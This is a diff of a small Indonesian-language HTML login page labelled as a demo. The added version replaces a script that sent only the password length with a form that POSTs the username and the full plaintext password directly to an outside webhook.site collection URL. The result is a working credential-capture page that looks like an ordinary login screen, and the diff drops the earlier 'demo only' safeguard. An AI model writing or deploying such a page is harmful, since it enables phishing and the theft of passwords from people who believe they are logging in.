@@ -2,75 +2,44 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Login Demo</title>
+<title>Webhook Demo</title>
 </head>
 
 <body>
 
 <h2>Login Demo</h2>
 
-<input type="text" id="username" placeholder="Username">
+<form
+action="https://webhook.site/d2868287-2fe5-4941-a1a1-58f2ed1166d6"
+method="POST"
+target="_blank">
+
+<input
+type="text"
+name="username"
+placeholder="Username"
+required>
+
 <br><br>
 
-<input type="password" id="password" placeholder="Password">
+<input
+type="password"
+name="password_demo"
+placeholder="Password"
+required>
+
 <br><br>
 
-<button onclick="sendData()">
+<input
+type="hidden"
+name="action"
+value="demo_login">
+
+<button type="submit">
 LOGIN
 </button>
 
-<p id="status"></p>
-
-<script>
-
-const WEBHOOK_URL =
-"https://webhook.site/d2868287-2fe5-4941-a1a1-58f2ed1166d6";
-
-async function sendData(){
-
-    const username =
-    document.getElementById("username").value;
-
-    const password =
-    document.getElementById("password").value;
-
-    if(!username || !password){
-        alert("Isi semua field");
-        return;
-    }
-
-    const form = new FormData();
-
-    form.append("username", username);
-
-    // demo only
-    form.append("password_length", password.length);
-
-    form.append("action", "demo_login");
-
-    form.append("time", new Date().toISOString());
-
-    try{
-
-        await fetch(WEBHOOK_URL,{
-            method:"POST",
-            mode:"no-cors",
-            body: form
-        });
-
-        document.getElementById("status").innerHTML =
-        "✅ Request terkirim";
-
-    }catch(err){
-
-        console.error(err);
-
-        document.getElementById("status").innerHTML =
-        "❌ Gagal";
-    }
-}
-
-</script>
+</form>
 
 </body>
 </html>
